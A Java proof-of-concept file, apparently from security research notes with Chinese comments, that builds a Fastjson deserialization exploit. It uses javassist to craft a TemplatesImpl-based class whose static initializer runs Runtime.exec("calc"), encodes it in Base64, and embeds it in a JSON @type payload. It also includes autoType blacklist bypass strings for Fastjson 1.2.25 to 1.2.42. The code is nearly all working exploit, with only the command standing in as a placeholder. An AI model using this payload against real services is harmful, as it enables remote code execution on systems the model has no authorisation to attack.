package 版本24;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.codec.binary.Base64;

public class jdk7u21_mine {
    public static class lala{

    }
    public static byte[] getevilbyte() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(lala.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        //之前说的静态初始化块和构造方法均可，这边试一下构造方法
        cc.makeClassInitializer().insertBefore(cmd);
//        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);
//        cons.setBody("{"+cmd+"}");
//        cc.addConstructor(cons);
        //设置不重复的类名
        String randomClassName = "LaLa"+System.nanoTime();
        cc.setName(randomClassName);
        //设置满足条件的父类
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        //获取字节码
        byte[] lalaByteCodes = cc.toBytecode();

        return lalaByteCodes;
    }

    public static void  poc() throws Exception {
        ParserConfig config = new ParserConfig();

        byte[] evilCode = getevilbyte();
        String evilCode_base64 = Base64.encodeBase64String(evilCode);
//        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        //1.2.25-41 绕过
//        final String NASTY_CLASS = "Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;";
        //1.2.25-42 绕过
        final String NASTY_CLASS = "LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;";
        String text1 = "{"+
                "\"@type\":\"" + NASTY_CLASS +"\","+
                "\"_bytecodes\":[\""+evilCode_base64+"\"],"+
                "'_name':'a.b',"+
                "'_tfactory':{ },"+
                "'outputProperties':{ }"+
                "}\n";
        System.out.println(text1);
        //1.2.25-41必须条件
//        config.setAutoTypeSupport(true);
//        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        //assertEquals(Model.class, obj.getClass());
    }
    public static void main(String args[]){
        try {
            poc();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
